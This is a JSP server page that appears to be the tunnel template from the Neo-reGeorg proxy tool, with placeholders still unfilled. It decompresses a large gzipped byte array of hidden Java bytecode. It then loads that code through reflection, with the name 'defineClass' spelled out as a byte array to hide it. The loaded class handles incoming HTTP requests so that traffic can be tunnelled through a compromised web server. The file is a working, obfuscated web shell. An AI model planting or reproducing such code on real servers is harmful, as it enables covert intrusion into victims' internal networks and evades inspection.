<%@page pageEncoding="UTF-8"%>
<%!
    public static byte[] unGzip(byte[] bytes) throws Exception{
        java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
        java.io.ByteArrayInputStream in = new java.io.ByteArrayInputStream(bytes);
        java.util.zip.GZIPInputStream ungzip = new java.util.zip.GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0)
            out.write(buffer, 0, n);
        return out.toByteArray();
    }

    public static Class loader(byte[] bytes) throws Exception {
        java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[0], Thread.currentThread().getContextClassLoader());
        java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(new String(new byte[]{100,101,102,105,110,101,67,108,97,115,115}), new Class[]{byte[].class, int.class, int.class});
		method.setAccessible(true);
		Class clazz = (Class) method.invoke(classLoader, new Object[]{bytes, new Integer(0), new Integer(bytes.length)}); 
		return clazz;
    }
%>

<%
    Object[] args = new Object[]{
        request, //0
        response, //1
        "BASE64 CHARSLIST".toCharArray(), //2
        new byte[]{BASE64 ARRAYLIST},//3
        new Integer(HTTPCODE),//4
        new Integer(READBUF),//5
        new Integer(MAXREADSIZE),//6
        "NeoGeorg says, 'All seems fine'",//7
    };


    if(application.getAttribute("BASE64 CHARSLIST") == null){
        byte[] clazzBytes = unGzip(new byte[]{31,-117,8,0,-27,-4,-94,99,0,3,-99,57,13,120,27,-43,-111,51,-42,74,-69,-110,54,-74,108,103,109,-81,45,39,-127,64,-112,101,27,67,18,4,-56,-7,105,-30,56,-119,-117,-19,-128,21,98,66,-128,68,-106,-41,-74,-120,34,25,73,78,98,-102,-90,41,13,20,-38,-76,-123,-46,31,18,104,8,-127,-94,22,92,8,37,-39,-40,-124,-124,-48,-106,-48,-46,63,-38,82,74,105,105,105,-23,15,-76,-67,59,-18,-82,119,-12,122,119,-72,51,-69,43,89,-78,-107,15,-66,-14,57,-13,-34,-101,55,111,102,-34,-52,-68,-103,89,-15,-62,-69,79,-99,2,-128,-117,-15,-49,46,40,-125,103,68,56,45,-62,-77,34,124,67,-124,-5,-100,112,15,124,83,-124,-125,60,126,75,-124,-25,92,-32,-124,51,34,60,-17,6,27,124,-37,13,-33,-127,23,-36,32,-64,119,69,-8,30,99,-66,47,-63,15,120,-4,-95,11,94,-124,31,49,-8,-79,8,63,113,-127,2,-49,48,120,-55,5,110,-8,41,-49,94,118,17,-65,-97,49,120,69,-124,-97,-69,-32,85,-8,5,-125,95,50,120,-115,-47,-65,98,-74,-65,102,94,-81,-117,-16,27,23,-52,-121,-33,50,120,67,-124,-33,-71,96,1,-4,-98,-63,31,68,-8,-93,11,-34,-124,-73,92,-48,0,127,-110,-128,-76,-1,11,-4,-117,8,-1,-54,-29,-65,49,120,-101,119,-2,-99,-71,-4,-121,11,-2,19,-2,-54,-32,-65,-36,-16,-33,-16,-114,27,-2,6,-1,-61,-32,-17,-68,-5,-65,44,-14,-1,-104,-25,-1,51,120,-105,-105,-109,4,16,72,99,68,23,-106,-96,-115,0,-23,71,-128,-12,91,-128,-126,27,-19,-24,112,-93,8,-17,72,40,49,-107,83,66,23,-17,-72,73,115,-108,121,54,-117,65,41,-125,50,-58,121,68,44,119,65,55,-103,2,43,-80,-110,102,56,-101,-127,-62,-121,-85,-56,-82,88,-51,84,53,-68,84,121,86,43,97,29,47,-68,-68,87,-17,-126,65,-100,-61,96,-82,-120,-13,92,112,61,-98,-29,-62,115,113,62,99,-50,115,-29,-7,-72,64,-62,11,36,-12,-71,-64,11,47,75,-40,-64,40,-65,-120,-115,68,4,-81,-15,-94,73,-62,102,23,94,-120,45,124,-30,34,-98,93,-20,-62,-123,-72,72,-62,-59,-68,-72,-124,65,-128,-63,-91,76,112,-103,-120,-105,-69,32,-51,110,75,99,80,-62,86,30,-105,72,-72,-108,-111,47,-77,-38,-53,24,44,-105,-16,3,-84,-30,10,6,43,25,-76,49,88,69,-82,-62,118,23,-36,-122,-85,-35,-72,6,-41,50,-24,16,-15,-125,-116,-71,66,-60,78,17,-69,92,112,59,118,51,-19,58,17,-81,116,-63,62,14,-117,125,120,21,-125,30,54,124,-120,-63,122,6,87,-117,-72,-63,5,119,-77,42,119,99,47,-125,107,68,-36,40,-30,-75,34,110,18,-15,58,-124,18,45,78,96,83,27,-127,126,-115,103,43,17,28,75,-94,-15,104,122,25,-126,-51,-41,-80,1,65,104,75,-16,-106,67,-69,105,36,28,75,33,40,-66,-50,27,-61,-37,-61,45,-79,112,124,-80,101,93,-33,-115,90,36,-35,-38,112,45,-126,-67,47,-80,-104,-71,85,-7,54,-83,108,-56,35,9,-91,-109,-47,-8,96,-85,73,-64,-100,-86,124,51,119,27,88,-80,115,72,11,-9,107,-55,-83,-38,40,-62,-126,98,68,-59,-72,-70,-38,119,70,-76,-31,116,52,17,39,-35,-60,104,42,-106,-120,-124,99,-45,-76,-52,-98,39,45,93,125,-79,-19,-101,-5,-75,-120,113,-89,106,86,117,-45,-52,-21,88,100,90,60,71,86,-28,-54,-122,-58,-55,112,-68,127,-27,104,90,35,-39,14,95,71,-121,-127,116,-11,49,98,125,-94,35,-98,-90,75,-77,-120,14,66,70,-29,-23,-11,9,-117,-44,-18,51,41,29,-37,-75,100,116,-128,110,-37,82,68,91,3,-77,-77,37,-82,-91,91,82,-87,88,75,40,-44,25,-46,82,41,-70,-89,113,-113,-118,-56,-112,22,-39,-38,22,-117,106,-60,55,57,-110,74,107,-3,8,-63,-84,-94,41,45,50,-110,-116,-90,71,91,34,90,50,-35,114,-51,37,23,93,-34,70,-109,-24,64,52,18,78,107,-83,69,44,-77,65,-60,-21,-77,76,67,90,-110,-12,-54,49,-83,24,-44,-46,43,34,108,99,-83,-65,35,-107,26,-47,-110,116,-125,11,124,13,-17,75,-108,12,-9,-61,33,-124,-54,-94,70,62,-33,-68,97,-118,-28,-59,-24,-106,67,-23,-12,112,-53,90,2,33,19,-47,67,17,-89,-91,-56,-122,11,-34,-117,46,53,76,-34,-41,100,-72,23,-18,-109,-31,75,112,16,-95,124,74,28,-71,65,27,-44,-110,50,-34,-128,-101,17,60,-45,-17,46,-29,22,12,-117,-40,39,99,4,-5,101,-44,112,-96,-128,-56,84,86,-58,65,62,12,50,14,97,84,-60,27,101,-36,-118,-101,101,-116,-63,81,-118,-114,-23,28,87,-114,68,99,-3,44,112,27,-58,-23,-2,-104,-112,113,24,111,-110,-31,97,-56,-56,-16,53,120,-116,-52,49,117,36,23,-67,34,-46,-119,20,-110,-88,17,56,36,-29,118,2,-16,40,-116,-55,-72,-125,-105,59,-15,38,4,-39,56,-58,1,113,117,79,39,115,38,-30,81,-68,25,-95,54,-73,-63,102,-95,-51,-74,68,60,78,106,19,91,25,63,-60,100,-69,-16,-61,8,-13,10,35,-118,105,83,5,-60,34,-18,-106,-15,35,-16,-96,-116,123,-16,-93,-12,-2,41,-26,68,-68,69,-58,-113,-31,94,75,-56,-44,105,35,62,-70,-62,-15,-80,97,-37,91,-15,54,25,63,-114,-73,-53,120,7,126,66,-58,79,-30,62,17,63,37,-29,-89,-15,51,50,-34,-119,119,-119,-8,89,25,-17,-58,-49,-119,-8,121,25,-65,-128,95,-108,-15,30,-36,47,-29,1,-8,-86,12,95,33,-128,-9,-30,125,50,126,9,15,-54,-16,56,28,-111,-31,33,-8,-78,-116,-9,-29,33,17,31,96,-93,28,-106,-15,65,124,72,68,66,62,-116,25,17,-65,-126,80,74,90,-89,41,-10,-101,59,-75,-8,96,122,72,-58,-81,-62,24,-71,125,61,61,-56,-44,-128,-106,108,110,-25,-73,107,-72,-9,17,-26,-1,40,-13,31,99,-97,13,-31,-41,100,124,-116,-63,-29,120,4,-95,-34,48,93,52,-47,-62,79,115,69,50,25,30,93,55,-110,30,30,73,-109,43,-75,-16,54,17,-97,-112,-15,-21,-8,36,43,65,110,60,-118,-28,-118,99,-52,101,24,117,25,-113,51,-45,113,114,45,78,112,-112,-117,109,-21,-70,-69,-37,-37,-42,-53,-8,20,-98,-112,-15,105,6,39,-15,-108,-116,-49,-32,-23,124,31,117,16,8,37,34,91,-23,89,-11,-9,39,-23,77,-77,43,-97,21,-15,27,50,126,19,-65,37,-29,115,120,70,-60,-25,101,-4,54,126,-121,50,-14,-70,43,40,5,-81,94,-47,-47,73,57,100,85,71,40,39,-29,5,-4,46,-62,92,-109,41,-87,31,25,10,-109,23,99,-87,22,-109,115,-101,-71,-108,-15,123,72,15,72,-24,105,95,-79,74,-60,-17,-53,-8,3,-4,33,-123,45,-66,40,-29,-113,-40,-70,63,-106,-15,39,-8,18,-87,-66,122,93,79,-17,-118,-98,85,50,-2,20,95,-106,-15,103,-8,-110,-116,-81,-80,-101,82,-8,34,37,-20,-103,17,62,48,96,6,-8,-49,73,-61,-91,75,121,-10,42,2,46,-27,-101,28,-31,83,100,89,108,-106,-15,23,-8,75,25,95,-61,95,-55,-8,107,54,-45,107,108,-75,-41,121,-10,27,14,-112,-33,-54,-8,6,11,-7,29,-18,71,80,115,-10,-23,-42,-46,59,18,-55,-83,-4,110,-109,3,-31,-120,38,-29,-17,113,31,-62,-20,2,3,90,-90,-93,68,95,-128,94,-100,53,41,-2,-127,-97,-36,97,120,16,-63,59,-61,-59,29,-15,-100,-121,-39,26,-4,-110,-15,-113,50,60,9,71,101,120,2,-66,46,-61,49,-48,-77,89,96,36,29,-115,-75,-12,80,-102,79,16,-19,-101,-8,-106,-116,127,-62,4,-62,-71,-17,-99,-4,-56,97,-35,90,34,-87,-83,33,48,-120,48,103,-38,-21,75,-92,-46,-15,-16,54,109,3,-105,-128,-88,-106,-100,65,-64,-36,-14,31,25,37,-35,34,50,-13,-28,-27,82,9,-126,68,-43,102,67,56,54,-94,25,69,-100,-53,15,37,113,-85,124,-112,-18,-66,-122,-50,-77,-90,84,-77,-60,-28,-76,57,27,5,-67,53,-125,-91,-79,107,-68,-59,-99,20,104,-13,102,112,46,-92,32,-66,78,58,-42,75,-6,-13,-123,-86,45,114,118,-50,-107,20,88,-42,6,81,121,6,-83,51,-15,-76,-7,-64,-23,-59,19,42,-49,113,8,-25,-99,77,88,30,85,107,54,-39,-110,-124,-126,-61,78,66,70,99,-31,-66,24,-103,72,32,20,21,58,71,120,120,88,-117,-45,-92,-7,125,-11,30,86,-102,111,-75,106,60,117,74,82,58,97,110,81,-80,-6,-118,54,43,-91,89,93,-78,22,-80,-17,-32,-55,89,-38,21,98,105,31,-120,-115,-92,-24,-14,-10,72,44,-111,34,58,59,5,-73,-106,54,-83,-40,-91,-91,-121,18,-92,110,105,-126,-44,-98,74,-30,-108,106,-78,-62,-83,82,49,-75,-57,-106,77,-27,42,107,-106,-127,-101,80,-85,18,102,-34,35,107,-8,-82,101,-55,101,83,-6,-76,-59,-62,-4,-46,92,-47,84,71,60,-107,14,-57,35,-92,72,37,-99,-103,25,-62,-13,125,-45,-70,-106,-23,36,-58,-91,106,10,105,-88,-54,-28,2,-56,109,56,57,43,-28,-62,-77,58,-94,-40,105,-70,-100,-64,-99,43,66,-81,-43,7,77,81,93,-95,-115,90,-49,-88,117,-6,86,-2,27,107,-99,-42,-45,-124,120,-94,-103,-81,-33,80,-99,-29,-46,-52,-80,-85,-61,-111,116,34,57,-102,-1,-102,-14,91,-75,124,-102,86,-45,92,-45,-47,69,-52,53,-29,36,-53,-28,-64,95,107,116,-58,-35,100,73,114,-124,-102,-11,-81,-111,-101,-38,-29,35,-37,-76,100,-40,114,-81,50,-75,-47,-106,-120,-59,76,-73,-45,25,33,22,-27,86,42,107,-47,25,39,-13,57,26,57,-78,-109,-24,-119,-97,-104,-44,-88,25,-28,-48,-85,-52,63,106,-20,26,-54,21,-30,56,-11,-92,-103,103,34,-55,-115,126,62,-41,14,11,79,76,43,102,98,73,-46,80,56,-43,109,4,1,-91,44,-22,112,-123,-72,-79,40,124,73,-71,-34,-47,-103,51,10,-79,-101,10,-23,43,-109,-12,24,-110,-23,81,-18,80,-49,-46,82,-49,120,99,101,-60,42,-65,-24,83,-128,-26,-27,-91,-4,29,-110,43,17,-79,-43,-59,11,62,-93,-119,-97,93,-116,-110,-82,67,73,-127,62,8,44,-2,-90,-86,-85,-93,90,-84,-97,78,-106,23,24,-90,43,60,76,-116,103,21,32,40,27,-47,103,80,-120,-97,122,33,49,-95,10,-119,13,26,-113,-7,113,-42,49,24,-89,122,-45,22,102,119,-107,22,74,37,-117,-91,-90,44,-58,42,101,-37,-26,54,-21,27,103,-22,-54,-123,-7,-109,25,-75,39,-109,-119,100,46,117,114,44,-89,-61,-23,17,-61,6,-58,21,-13,-69,-22,81,-6,108,48,18,44,71,81,36,49,76,-66,-16,23,-7,100,-20,40,-126,50,120,-71,-45,-119,92,-95,38,51,-60,-84,-12,-81,-112,-92,98,41,-43,25,-18,-17,-49,94,75,32,36,-119,118,27,73,-46,108,82,-120,32,-110,-40,54,28,78,106,-21,19,103,73,-77,84,30,37,34,72,105,-58,7,-101,-64,-39,-108,-97,102,54,-121,-98,-75,-71,34,-31,-114,-108,-127,-32,-57,-111,-105,114,77,-86,-42,-30,95,-70,29,83,-55,117,-118,-106,-62,37,98,38,105,106,87,124,-45,57,89,61,-115,121,-76,-100,8,7,-94,-125,-108,-106,86,-46,-89,-18,86,-93,-38,-8,40,101,23,-45,86,-29,-9,-49,53,110,74,99,-81,-103,112,-118,-105,103,-6,-60,32,-61,-83,72,-109,-90,125,35,92,-106,-34,-29,17,101,63,-123,73,45,121,-80,-32,-32,123,125,-66,-25,-34,113,89,82,-37,-106,-40,-82,-27,29,-83,-52,93,-124,-61,32,-21,69,41,28,-29,47,123,38,-88,-55,69,66,33,81,43,111,21,-35,96,23,-37,-61,102,64,-107,77,17,88,-84,-87,-74,106,-31,100,-66,15,115,-101,-60,-46,102,20,69,117,-22,71,-115,25,66,-123,-127,88,-108,30,-84,76,-7,-85,71,-37,22,-90,18,-60,62,-87,-13,-75,21,-21,25,-84,51,77,-17,-77,-59,-80,-56,-19,-87,-31,24,23,-74,98,-2,40,-8,1,99,-22,89,-92,70,-6,82,86,51,82,-59,-65,76,20,35,-94,-89,118,53,-11,60,73,51,99,-120,-125,102,73,-89,-108,70,-77,-23,93,120,-86,-96,-74,-28,-107,14,50,41,-35,-68,-117,18,79,123,76,-37,70,13,27,81,-70,57,119,91,75,-77,104,-26,-11,-20,-52,-86,-44,-110,-107,107,-29,-83,116,73,-114,18,-7,-84,-7,20,125,6,-62,-55,8,35,-25,-62,57,112,15,-108,65,9,-20,-121,3,4,75,-8,-125,31,-128,70,-6,-26,-89,-79,12,-112,127,110,32,-8,0,-83,-54,105,-92,79,118,-80,-5,-113,3,62,1,-4,31,-14,7,-127,-71,109,127,20,28,48,-113,-58,53,-115,-89,-95,-124,-2,-70,-102,108,11,79,-125,-83,-69,73,-96,65,8,10,-2,38,59,77,-20,-12,119,12,28,-2,38,7,45,68,-6,59,6,82,-109,72,115,-89,14,-82,-128,-67,73,-54,78,29,77,30,71,118,46,54,121,-104,-60,29,-108,-124,-128,-45,30,112,57,2,110,49,32,75,-127,89,30,71,-96,-44,35,6,-54,60,82,-64,-45,60,1,50,-62,4,-52,66,8,-106,-85,-62,4,-108,-46,-92,-62,-29,58,9,101,-63,74,115,-104,77,52,30,-6,-64,-70,31,-6,42,-54,-125,10,-83,42,-120,-90,74,-83,-46,-95,50,80,-83,84,-105,28,2,71,6,46,85,-86,-97,-106,-126,53,106,-107,90,-93,-61,108,19,55,-1,4,40,27,-113,67,-107,-86,-24,80,125,2,-36,27,-43,-102,-29,64,-37,-43,58,-88,65,37,51,-7,-116,-97,119,106,-125,-43,106,-11,56,-44,5,43,51,80,19,84,-44,10,85,-46,-95,94,-83,-48,97,14,-125,-71,-74,49,-75,82,41,51,110,-94,-88,-54,-103,18,52,78,-51,59,-128,127,99,60,-122,88,-21,115,-88,93,-98,-128,115,89,-81,19,48,127,-93,-86,28,-121,-13,-104,-83,14,-25,-97,-122,5,-92,86,13,-85,123,-127,90,35,-24,-32,-85,104,96,29,-3,-5,-95,69,-83,57,13,13,126,29,26,43,-102,-58,-95,57,-88,-86,42,10,39,-31,-62,-115,54,127,8,117,107,91,85,117,-72,72,-121,-117,-119,-1,66,-30,79,52,-29,-80,40,88,-85,-42,-114,-61,98,-75,118,2,46,33,100,-99,90,55,1,1,-92,-128,-16,-15,-20,82,4,-42,-42,-37,-84,122,39,-32,-78,18,8,-42,-109,124,-17,56,92,-82,-42,-21,16,-52,76,-66,-108,-77,-24,101,-84,73,107,-80,46,3,98,-48,107,27,-13,-85,-107,-29,-80,68,-121,-91,65,-81,-22,-43,97,25,29,-84,83,-21,109,106,-3,41,29,-106,-85,117,58,124,-128,-63,10,62,-76,114,2,-38,-40,113,-85,10,-60,47,-49,23,-81,122,-49,64,-93,-22,-83,104,-41,97,-11,1,56,-121,102,107,-116,89,53,107,-93,-61,90,-30,46,-88,94,-75,126,2,58,108,-112,-103,60,-55,108,63,88,-114,119,30,-122,89,60,-67,-126,-43,-86,-27,89,39,75,120,30,74,85,65,-79,79,64,87,9,-40,-58,-54,5,32,119,-41,-97,-128,110,114,-16,-70,-32,28,-42,-109,-4,-66,49,-32,-91,91,-51,81,-68,-76,57,-105,53,-97,107,83,-24,-30,87,-86,115,-44,-71,58,92,-107,-103,124,-43,8,-125,57,58,-12,80,36,16,-119,80,-47,-50,59,-95,113,88,63,1,87,-37,-128,52,98,45,12,41,20,9,-76,-75,97,122,48,-112,-69,123,41,21,102,117,-95,32,112,26,-63,65,17,121,6,-1,76,75,-105,-79,-84,86,-85,42,-82,-47,97,-29,1,24,36,-36,44,3,87,67,-77,82,-98,-115,-61,-75,1,-14,-29,38,-10,-93,14,-41,-99,-128,-21,41,54,21,-11,56,-36,80,-18,30,-41,97,-77,90,107,-45,97,75,-81,90,-82,86,-77,-113,-61,-92,-40,108,-59,93,-47,23,-54,96,-100,-72,-16,60,18,-94,65,102,109,-5,9,123,13,73,-45,12,105,126,62,52,1,3,37,-28,-124,65,-114,60,-30,-81,-61,80,6,-20,20,59,-58,86,-76,4,50,120,1,29,-72,-47,56,-16,-56,-12,3,103,96,-121,-30,24,-121,-83,68,95,-61,-47,23,11,-44,42,98,-96,-50,22,-16,102,-51,93,-81,-44,30,-124,30,-91,-106,-84,60,-121,41,-74,-39,-44,57,54,-91,-106,13,93,-49,-58,-67,-118,-111,-15,94,-59,-85,-44,110,9,16,80,28,15,-128,-117,86,117,15,-128,-121,-76,-10,-80,-81,122,66,25,40,-53,9,-56,76,62,-98,-67,33,84,-111,-32,-68,27,-86,-58,13,97,59,41,-100,48,20,-114,77,83,-72,82,-15,88,105,-119,95,-57,41,-42,-100,-52,-54,-25,-122,123,-39,-68,55,25,48,-71,-97,2,-88,-122,103,-87,-34,-52,-28,-37,57,105,115,-118,72,-53,26,77,-83,-16,-85,-77,-51,23,81,16,5,25,-104,61,35,77,100,64,-24,-78,-115,-127,27,-18,69,1,69,-16,-30,59,-8,110,9,117,26,-74,-21,108,25,-37,35,52,-66,98,123,-35,-10,6,120,5,-89,112,-121,-80,-113,-58,-89,-124,119,-124,-65,-125,-105,-14,113,-99,125,21,-47,123,75,4,30,75,-20,37,-113,25,-29,-29,54,31,-113,-74,6,-5,10,30,-115,-60,-3,16,124,-39,76,-36,88,5,118,-112,104,116,-99,-128,52,-7,100,-92,-85,-15,-44,50,91,64,80,-124,-6,-61,-16,-41,70,69,-40,43,-32,-94,114,-104,-36,29,-80,19,-22,16,52,54,-7,-113,-126,67,-79,-37,119,45,-42,97,123,-81,-75,114,-20,22,119,-102,-21,-118,29,58,-20,-20,-51,-64,68,-2,81,-121,113,-76,-3,-84,71,21,71,57,-68,-67,91,-36,-75,39,111,-61,-31,41,-37,109,-49,50,29,53,-103,-10,-25,51,21,-1,9,118,-118,88,14,-89,119,123,28,5,91,-94,103,-7,110,99,-103,-103,-108,-101,116,-72,-7,-120,85,-36,30,-122,-116,101,-93,10,16,-64,69,-93,-93,-111,114,89,87,-45,-87,101,28,-65,-11,-57,-31,67,65,-63,70,118,-79,-109,-87,-34,36,86,82,-109,98,-33,107,-57,69,-117,-24,-62,-116,115,42,-114,-110,-5,39,-33,34,104,84,-111,-25,10,72,68,-117,68,52,72,68,-109,-28,48,101,3,7,-85,-23,-71,-120,-11,-41,97,-105,69,31,-112,20,-55,-77,-12,16,56,85,74,-4,61,71,-104,-109,34,49,-42,100,34,17,-109,87,8,26,76,-82,39,38,34,93,-105,12,33,121,-106,-20,-74,23,-16,113,42,-50,-23,124,-100,-116,53,-7,56,13,62,78,-109,-113,66,124,36,7,89,107,-89,-30,100,22,-103,-55,26,-13,-108,97,31,-119,127,105,-90,94,-127,123,-125,20,-39,-57,65,-29,96,69,121,-89,-65,-30,-61,58,-20,102,35,101,-93,104,109,-109,34,44,12,-38,-83,26,74,38,-84,86,-19,54,98,-12,17,29,-10,24,11,-102,127,-44,44,-90,-99,121,68,-52,-57,-64,-111,-57,51,-109,-29,-115,54,66,-122,-124,126,58,103,42,-16,8,-3,19,-56,65,28,-48,-113,-62,-104,-91,-54,86,-80,-127,72,-29,102,46,-97,-115,84,61,117,-72,-91,107,28,62,-42,77,-91,106,47,87,-106,53,52,-71,-107,11,-53,109,65,-127,-81,-13,-15,-96,93,-75,91,123,62,-98,25,-101,-73,7,29,-86,-29,89,-72,99,63,-108,-85,14,29,62,65,113,-15,-55,-3,96,23,-58,-88,-24,101,38,117,122,-97,-123,42,56,-7,-1,68,88,-99,-46,-83,-12,-94,-100,52,-114,26,109,71,-89,109,-87,-1,-44,50,-111,50,28,89,96,-33,70,-22,-98,62,21,116,120,-55,44,-101,-104,-15,-89,3,-126,-22,32,115,-88,118,-86,-116,-97,-23,85,-19,-29,112,39,-123,6,-109,75,-76,33,-39,84,-55,-40,-16,74,-118,-72,101,-53,82,69,-16,72,-121,-95,70,17,14,66,37,-67,5,-93,6,73,84,-128,40,-3,56,105,-83,74,-95,-52,-28,-61,-115,-90,125,-100,-4,-37,-65,-91,-46,45,-106,-125,-30,126,-101,-28,-95,68,116,87,-56,-17,113,90,51,43,23,-109,-98,94,-1,-87,-61,-48,-31,-9,46,60,3,75,9,118,55,63,11,-18,-3,80,-42,76,117,-122,107,-72,-112,1,-71,-39,-54,-113,66,35,21,-34,93,-115,-86,64,89,-14,-77,-108,-89,27,-39,-108,87,113,109,-80,-17,45,33,119,29,111,52,2,5,-95,27,110,-128,-80,-31,35,39,-1,22,108,-23,115,33,121,-55,78,-29,-71,39,-32,110,18,-2,-71,-82,-90,-70,-38,126,97,-117,14,-97,-81,-35,-78,-84,-98,46,47,52,49,-61,47,-88,66,-10,46,79,-62,81,-21,-20,-91,116,-74,-124,-58,70,-65,-61,72,4,126,-69,49,120,-92,-99,123,-4,-126,57,-11,-48,-44,102,78,107,118,-18,89,82,55,102,49,57,6,-70,-59,100,57,25,-124,-103,44,34,75,119,54,58,106,-103,-10,-82,-11,-115,-10,90,-113,116,-77,53,23,106,61,-98,-20,-36,86,-21,-87,-55,-50,-77,-23,-31,56,-116,91,-52,74,105,-76,-47,88,34,-116,89,123,19,-16,-108,21,-113,-77,-24,31,-17,89,45,115,54,98,78,-48,-65,-89,-33,15,-47,73,56,53,-67,1,-73,-99,-124,47,-102,74,-64,63,0,98,-52,-54,103,46,33,0,0});
        Class clazz = loader(clazzBytes);
        application.setAttribute("BASE64 CHARSLIST",clazz.newInstance());
    }
    application.getAttribute("BASE64 CHARSLIST").equals(args);
%>
